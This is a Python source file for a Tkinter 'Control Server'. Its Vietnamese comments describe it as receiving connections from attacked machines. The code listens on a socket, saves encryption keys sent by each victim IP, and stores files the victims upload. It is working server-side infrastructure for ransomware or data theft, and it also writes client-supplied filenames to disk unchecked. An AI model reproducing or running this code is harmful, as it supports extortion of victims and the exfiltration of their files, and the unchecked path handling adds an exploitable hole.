import socket
import threading
import json
import os
import tkinter as tk


class ControlServer:
    def __init__(self, host, port, update_log_callback):
        self.host = host
        self.port = port
        self.server = None
        self.update_log = update_log_callback
        self.client_directories = {}
        self.lock = threading.Lock()  # Ensure thread safety for shared resources

    def create_directory(self, client_ip):
        """Tạo thư mục với tên là địa chỉ IP của client nếu chưa tồn tại."""
        base_path = os.path.expanduser('/home/ubuntu/Documents/container-code')

        with self.lock:  # Ensure thread safety
            if not os.path.exists(base_path):
                os.makedirs(base_path, exist_ok=True)
                print(f"[✔] Created base directory: {base_path}")

            client_dir = os.path.join(base_path, client_ip)
            os.makedirs(client_dir, exist_ok=True)
            print(f"[✔] Created client directory: {client_dir}")

            self.client_directories[client_ip] = client_dir
            return client_dir

    def save_key(self, client_ip, encryption_key):
        """Lưu khóa mã hóa vào file riêng biệt trong thư mục của client."""
        client_dir = self.create_directory(client_ip)
        key_file_path = os.path.join(client_dir, "encryption_key.txt")
        
        with open(key_file_path, 'w') as key_file:
            key_file.write(encryption_key)
        
        self.update_log(f"Saved encryption key for {client_ip} at {key_file_path}", "success")
        print(f"[✔] Saved encryption key at {key_file_path}")

    def save_file(self, client_ip, filename, content):
        """Lưu file vào thư mục của client."""
        client_dir = self.create_directory(client_ip)
        file_path = os.path.join(client_dir, filename)
        
        with open(file_path, 'wb') as f:
            f.write(content)
        
        self.update_log(f"Saved file: {file_path}", "success")

    def handle_client(self, connection, address):
        """Xử lý mỗi kết nối từ máy bị tấn công."""
        client_ip = address[0]
        self.update_log(f"Connection established from {client_ip}", "info")
        
        try:
            data = b""
            while True:
                part = connection.recv(4096)
                if not part:
                    break
                data += part

            if data:
                try:
                    message = json.loads(data.decode('utf-8'))  # Ensure UTF-8 decoding
                except json.JSONDecodeError:
                    self.update_log(f"Invalid JSON received from {client_ip}.", "error")
                    return
                
                if 'type' in message and message['type'] == 'key_info':
                    self.save_key(client_ip, message['encryption_key'])  # Sửa 'key' thành 'encryption_key'
                elif 'filename' in message and 'content' in message:
                    self.save_file(client_ip, message['filename'], message['content'].encode('latin1'))
                    self.update_log(f"File {message['filename']} received and saved.", "success")
                else:
                    self.update_log(f"Invalid message format from {client_ip}.", "error")
        except Exception as e:
            self.update_log(f"Error handling client {client_ip}: {e}", "error")
        finally:
            connection.close()

    def start(self):
        """Bắt đầu server."""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        self.update_log(f"Server listening at {self.host}:{self.port}", "success")
        try:
            while True:
                connection, address = self.server.accept()
                threading.Thread(target=self.handle_client, args=(connection, address)).start()
        except OSError:
            self.update_log("Server stopped.", "error")
        finally:
            self.server.close()

    def stop(self):
        """Dừng server."""
        if self.server:
            self.server.close()
            self.update_log("Server stopped successfully!", "error")


class ServerApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Control Server")
        self.master.geometry("700x500")
        self.server = None

        # GUI Components
        self.start_button = tk.Button(master, text="Start Server", command=self.start_server, bg="green", fg="white")
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(master, text="Stop Server", command=self.stop_server, bg="red", fg="white")
        self.stop_button.pack(pady=10)

        self.log_label = tk.Label(master, text="Server Logs", font=("Arial", 14))
        self.log_label.pack()

        self.log_text = tk.Text(master, height=15, width=70, state="disabled")
        self.log_text.pack(pady=10)

    def start_server(self):
        if not self.server:
            self.server = ControlServer('10.20.20.1', 12345, self.update_log)
            threading.Thread(target=self.server.start, daemon=True).start()
            self.update_log("Server started successfully.", "success")

    def stop_server(self):
        if self.server:
            self.server.stop()
            self.server = None

    def update_log(self, message, tag="info"):
        self.log_text.configure(state="normal")
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.configure(state="disabled")
        self.log_text.see(tk.END)


if __name__ == "__main__":
    root = tk.Tk()
    app = ServerApp(root)
    root.mainloop()
